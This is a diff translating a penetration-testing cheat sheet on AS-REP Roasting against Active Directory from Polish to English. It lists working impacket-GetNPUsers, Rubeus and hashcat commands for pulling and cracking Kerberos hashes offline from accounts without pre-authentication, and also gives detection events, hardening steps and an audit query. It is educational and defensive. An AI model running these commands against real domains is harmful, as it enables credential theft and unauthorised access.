@@ -12,14 +12,14 @@ author: "core"
 # AS-REP Roasting
 
 ## TL;DR
-Konta z wyłączonym Kerberos pre-auth (`DONT_REQ_PREAUTH`) oddają zaszyfrowany hasłem fragment AS-REP **bez uwierzytelnienia** → offline crack. Nie potrzebujesz nawet ważnych poświadczeń, jeśli masz listę użytkowników.
+Accounts with Kerberos pre-auth disabled (`DONT_REQ_PREAUTH`) hand over a password-encrypted portion of the AS-REP **without authentication** → offline crack. You don't even need valid credentials if you have a user list.
 
-## Komendy
+## Commands
 ```bash
-# Bez poświadczeń – tylko lista userów
+# No credentials – just a user list
 impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -no-pass -format hashcat
 
-# Z poświadczeniami – wyszukaj podatne konta
+# With credentials – find vulnerable accounts
 impacket-GetNPUsers corp.local/user:'Pass' -dc-ip 10.10.10.10 -request -format hashcat
 ```
 ```powershell
@@ -31,16 +31,16 @@ Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
 hashcat -m 18200 hashes.txt rockyou.txt   # Kerberos 5 AS-REP etype 23
 ```
 
-## Wykrywanie (Blue Team)
-- Event **4768** (AS-REQ) z pre-auth type 0 / brak pre-auth.
-- Enumeracja wielu kont bez pre-auth z jednego źródła.
+## Detection (Blue Team)
+- Event **4768** (AS-REQ) with pre-auth type 0 / no pre-auth.
+- Enumeration of many accounts without pre-auth from one source.
 
-## Mitygacja / Hardening
-- Włącz Kerberos pre-auth na wszystkich kontach (usuń `DONT_REQ_PREAUTH`).
-- Długie hasła/AES; audytuj konta z tą flagą:
+## Mitigation / Hardening
+- Enable Kerberos pre-auth on all accounts (remove `DONT_REQ_PREAUTH`).
+- Long passwords/AES; audit accounts with this flag:
 ```powershell
 Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol
 ```
 
-## Źródła
+## Sources
 - [MITRE T1558.004](https://attack.mitre.org/techniques/T1558/004/)
